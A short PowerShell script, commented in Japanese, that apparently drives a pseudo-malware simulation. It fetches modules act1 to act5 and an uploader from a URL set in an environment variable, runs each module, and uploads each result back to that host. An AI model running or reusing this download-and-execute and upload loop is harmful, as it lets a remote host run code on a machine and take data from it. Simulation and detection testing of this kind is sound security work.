# act1.psm1からact5.psm1を順次ダウンロードして定義された関数を実行する。

$url = $env:PseudoMalwareURL

# アップロードモジュールのダウンロードとインポート
$moduleName = "uploader.psm1"
Invoke-WebRequest -Uri "$url/$moduleName" -OutFile $moduleName
Import-Module ".\$moduleName"

# 各actのダウンロード、インポート、実行、結果のアップロード
1..5 | ForEach-Object {
    $functionName = "act$_"
    $moduleName = $functionName + ".psm1"
    $responseFilePath = ".\response." + $functionName + ".txt"
    
    Invoke-WebRequest -Uri "$url/$moduleName" -OutFile $moduleName
    Import-Module ".\$moduleName"
    & $functionName -responseFilePath $responseFilePath
    uploader -filePath $responseFilePath -uri $url
}
